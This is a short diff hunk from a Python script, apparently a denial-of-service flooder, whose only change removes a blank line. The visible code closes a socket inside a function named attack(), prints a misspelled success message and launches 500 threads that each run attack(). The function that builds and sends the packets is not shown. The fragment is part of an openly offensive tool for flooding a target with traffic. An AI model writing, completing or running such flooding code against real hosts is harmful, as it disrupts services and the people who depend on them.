@@ -47,7 +47,6 @@ def attack():
         
         s.close()
 print("Packets Send Sucess!")
-
 for i in range(500):
     thread = threading.Thread(target=attack)
     thread.start()
